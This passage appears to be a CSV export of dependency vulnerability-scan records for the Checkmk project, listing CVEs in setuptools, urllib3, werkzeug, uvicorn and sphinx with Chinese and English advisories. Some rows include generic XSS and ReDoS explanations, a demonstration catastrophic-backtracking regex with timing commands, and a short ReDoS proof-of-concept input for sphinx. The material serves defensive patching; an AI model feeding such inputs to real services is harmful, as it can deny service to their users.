The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `setuptools` to version 65.5.1 or higher.
## References
- [GitHub Commit](https://github.com/pypa/setuptools/commit/58e23de0d4c2ce0f2502d072bb9a2ed1e2ab0ba6)
- [GitHub Issue](https://github.com/pypa/setuptools/issues/3659)
",4,0
Checkmk_checkmk,setuptools,,True,CVE-2013-1633,CWE-20,2013-08-06,"setuptools是Python软件基金会的Python Enterprise Application Kit（PEAK）的一个副项目，它替换了标准的distutils库，并为Python添加了版本化的包和依赖性管理。PEAK是用来在Python中进行快速组件开发和代码重用的框架。
Python setuptools 0.7之前的版本中的easy_install命令中存在安全漏洞，该漏洞源于程序使用HTTP协议对PyPl存储库中的程序包进行检索时，没有对其内容进行完整性检查。中间人攻击者可通过对产品默认使用的特制响应利用该漏洞执行任意代码。",3,0
Checkmk_checkmk,setuptools,,True,CVE-2024-6345,CWE-94,,setuptools 是一个开源的 Python 库，广泛用于 Python 项目的打包和依赖管理。该库的 package_index 模块在 69.1.1 及之前版本中存在代码注入漏洞。该漏洞源于下载功能的不当控制，该功能允许攻击者通过提供恶意 URL，执行任意命令。虽然由于 easy_install 和 package_index 已被弃用，利用该漏洞的表面已经减少，但仍然存在通过社交工程或对包索引的轻微妥协而实现远程访问的可能性。,2,1
Checkmk_checkmk,setuptools,,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
Checkmk_checkmk,setuptools,,True,,,,<p>setuptools 是一个用于 Python 包管理和构建的工具，它简化了包的创建和分发过程。此漏洞的根本原因是使用了已弃用的函数 `tempfile.mktemp()`，该函数不安全，因为在调用 mktemp() 和随后尝试创建文件之间，另一个进程可能会创建一个具有相同名称的文件。这种函数在创建临时文件名时不确保对返回的临时名称的独占访问性，操作之间没有原子性保证，从而为攻击者提供了干扰文件的机会，可能在文件打开之前进行篡改。</p>,3,1
Checkmk_checkmk,simplejson,,True,CVE-2014-4616,CWE-129,2014-06-20,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。simplejson是一个可扩展的JSON解码/编码器。_json module是其中的一个数据交换模块。
Python 2.7版本至3.5版本和simplejson 2.6.1之前的版本中的_json模块的‘scanstring’函数存在安全漏洞。本地攻击者可通过向‘raw_decode’函数发送带有负的指针值的‘idx’参数利用该漏洞读取任意的进程内存。",3,0
Checkmk_checkmk,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
Checkmk_checkmk,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
Checkmk_checkmk,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
Checkmk_checkmk,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
Checkmk_checkmk,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
Checkmk_checkmk,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
Checkmk_checkmk,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
Checkmk_checkmk,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
Checkmk_checkmk,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
Checkmk_checkmk,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
Checkmk_checkmk,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
Checkmk_checkmk,uvicorn,,True,CVE-2020-7695,CWE-74,2020-07-20,"Encode OSS Uvicorn是英国Encode OSS公司的一款基于uvloop和httptools构建的ASGI（Web服务器网关接口）服务器。
Encode OSS Uvicorn 0.11.7之前版本中存在注入漏洞，该漏洞源于程序没有转义HTTP标头中的CRLF序列。攻击者可利用该漏洞向HTTP相应中添加任意标头或使其返回任意相应主体。",2,2
Checkmk_checkmk,uvicorn,,True,,CWE-362,2023-08-01,"## Overview
[uvicorn](https://github.com/encode/uvicorn) is a lightning-fast ASGI server.

Affected versions of this package are vulnerable to Race Condition in the `uvicorn/protocols/http` component that leads Quart to hang with uvicorn. This vulnerability may allow an attacker to disrupt the server's response handling process under certain conditions, leading to potential Denial of Service (DoS) or other adverse impacts.
## Remediation
Upgrade `uvicorn` to version 0.12.3 or higher.
## References
- [GitHub Commit](https://github.com/encode/uvicorn/commit/de213614b7f8309f411e30a31d274d01b129607d)
- [GitHub PR](https://github.com/encode/uvicorn/pull/848)
- [GitHub Release](https://github.com/encode/uvicorn/releases/tag/0.12.3)
",3,0
Checkmk_checkmk,uvicorn,,True,CVE-2020-7694,CWE-94 CWE-116,2020-07-20,"Encode OSS Uvicorn是英国Encode OSS公司的一款基于uvloop和httptools构建的ASGI（Web服务器网关接口）服务器。
Encode OSS uvicorn（所有版本）中存在安全漏洞。攻击者可借助特制的URL利用该漏洞污染uvicorn的访问日志，影响此类文件的完整性。",2,0
Checkmk_checkmk,werkzeug,,True,CVE-2023-25577,CWE-770,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于Werkzeug multipart表单数据解析器可以解析无限数量的文件、字节部分，但每个部分都需要 CPU 时间来解析，并且可能会使用更多内存，如果向 `request.data`、`request.form`、`request.files` 或 `request.get_data(parse_form_data=False)` 的端点发出请求，则可能会导致意外的高资源使用率，攻击者利用该漏洞可以导致拒绝服务。",2,2
Checkmk_checkmk,werkzeug,,True,CVE-2023-23934,CWE-20,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于浏览器可能允许看起来像“=value”而不是“key=value”的“无名”cookie。",4,0
Checkmk_checkmk,werkzeug,,True,CVE-2022-29361,CWE-444,2022-05-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.1.0版本及之前版本存在环境问题漏洞，该漏洞源于不正确解析 HTTP 的请求。攻击者利用该漏洞通过特制的 HTTP 请求执行 HTTP 请求走私。",1,1
Checkmk_checkmk,werkzeug,,True,,CWE-310,2020-04-03,"## Overview
[Werkzeug](https://werkzeug.palletsprojects.com/) is a WSGI web application library.

Affected versions of this package are vulnerable to Insufficient Randomness. `SHA1` hash algorithm is used with 1000 rounds for hashing. This deviates from security best practice.
## Remediation
Upgrade `Werkzeug` to version 0.12 or higher.
## References
- [GitHub PR](https://github.com/pallets/werkzeug/pull/753)
",4,0
Checkmk_checkmk,werkzeug,,True,,CWE-331,2020-04-03,"## Overview
[Werkzeug](https://werkzeug.palletsprojects.com/) is a WSGI web application library.

Affected versions of this package are vulnerable to Insufficient Entropy. Secure cookies created as part of  ` werkzeug.contrib.securecookie` were generate through weak hashing which deviates from security best practice.
## Remediation
Upgrade `Werkzeug` to version 0.3.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/84eabcaa81f60d47939ac2d43f01d01eeab598a4)
- [GitHub Release Notes](https://github.com/pallets/werkzeug/blob/master/CHANGES.rst#version-031)
",4,0
Checkmk_checkmk,werkzeug,,True,CVE-2016-10516,CWE-79,2017-10-23,"Pallets Flask是Pallets项目中的一个基于Python的Web应用开发工具。Pallets Werkzeug是其中的一个WSGI工具包。
Pallets Flask和其他产品中使用的Pallets Werkzeug 0.11.11之前的版本的debugger的debug/tbtools.py文件的‘render_full’函数存在跨站脚本漏洞。远程攻击者可借助带有异常消息的字段利用该漏洞注入任意的Web脚本或HTML。",3,0
Checkmk_checkmk,werkzeug,,True,,CWE-113,2017-12-04,"## Overview
Affected versions of [`werkzeug`](https://pypi.python.org/pypi/werkzeug) are vulnerable to HTTP Response Splitting.
It allows newline characters in values in the header. An attacker can leverage this to inject arbitrary headers and conduct HTTP response splitting attacks.

## Remediation
Upgrade `werkzeug` to version 0.8 or higher.

## References
- [GitHub Changelog](https://github.com/pallets/werkzeug/blob/master/CHANGES#L722)
- [Github Commit](https://github.com/pallets/werkzeug/commit/694aae3ec2b73292ffe6ab960807bc8cf8474b81)
",3,2
Checkmk_checkmk,werkzeug,,True,,CWE-79,2016-08-31,"## Overview
[`werkzeug`](https://pypi.python.org/pypi/werkzeug) is the Swiss Army knife of Python web development.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks via the `plaintext` variable in the debug page.

## Details
A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

ֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.


## References
- [GitHub PR](https://github.com/pallets/werkzeug/pull/1001)
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/1034edc7f901dd645ec6e462754111b39002bd65)
",3,2
Checkmk_checkmk,werkzeug,,True,,CWE-79,2012-02-05,"## Overview
[`werkzeug`](https://pypi.python.org/pypi/werkzeug) is the Swiss Army knife of Python web development.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks due to the lack of sanitization of the redirect url links.

## Details
A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

ֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.


## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/7b8d887d33c768a77f40dd15ff5ac6ebbbab25b9)
",3,2
Checkmk_checkmk,werkzeug,,True,CVE-2020-28724,CWE-601,2020-11-18,"Pallets Werkzeug是一款WSGI Web应用程序库。
werkzeug 0.11.6之前版本存在安全漏洞，该漏洞源于在URL中通过双斜杠打开重定向漏洞。",3,0
Checkmk_checkmk,werkzeug,,True,CVE-2023-46136,CWE-400 CWE-407 CWE-787,2023-10-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 3.0.1之前版本存在安全漏洞，该漏洞源于允许攻击者通过将精心设计的多部分数据发送导致拒绝服务。",2,0
Checkmk_checkmk,werkzeug,,True,CVE-2019-14322,CWE-22,2019-07-28,Pallets Werkzeug 是一款WSGI Web应用程序库，提供了用于开发Web应用的工具和功能。在Pallets Werkzeug 0.15.5之前的版本中，SharedDataMiddleware组件存在安全漏洞。该漏洞的根本原因是SharedDataMiddleware错误处理了在Windows路径名称中的驱动程序名（例如：C:）。攻击者可以利用这一漏洞，通过构造特殊请求来访问服务器上的任意文件，导致信息泄露。,2,1
Checkmk_checkmk,werkzeug,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to slow multipart parsing for large parts.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `werkzeug` to version 3.0.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1)
",2,2
Checkmk_checkmk,werkzeug,,True,CVE-2019-14806,CWE-331,2019-08-09,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 0.15.3之前版本中存在安全漏洞，该漏洞源于Docker容器中调试程序PIN码随机不充分。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",2,2
Checkmk_checkmk,werkzeug,,True,CVE-2024-34069,CWE-352,2024-05-06,"Werkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3.",2,0
Checkmk_checkmk,werkzeug,,True,CVE-2024-49766,CWE-22,2024-10-25,Werkzeug 是 Pallets 开发的一个开源全面的WSGI Web应用程序库。在Werkzeug 3.0.6之前的版本中，存在一个路径遍历漏洞。该漏洞的根本原因是，当在Windows系统上且Python版本小于3.11时，os.path.isabs函数无法正确检测UNC路径。这可能导致Werkzeug的safe_join函数生成不安全的路径，从而允许潜在的非预期数据访问。,3,2
Checkmk_checkmk,werkzeug,,True,CVE-2024-49767,CWE-400 CWE-770,2024-10-25,Werkzeug 是一个由 Pallets 开源的全面的 WSGI web 应用程序库，旨在为开发人员提供简单、灵活的工具来搭建 Web 应用程序。在 Werkzeug 3.0.6 之前的版本中，当解析 multipart/form-data 请求时存在拒绝服务漏洞。攻击者可以通过构建特制的请求来耗尽服务器资源，从而导致服务无法响应。,3,2
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
Checkmk_checkmk,sphinx,,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
Checkmk_checkmk,sphinx,,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
Checkmk_checkmk,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
Checkmk_checkmk,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

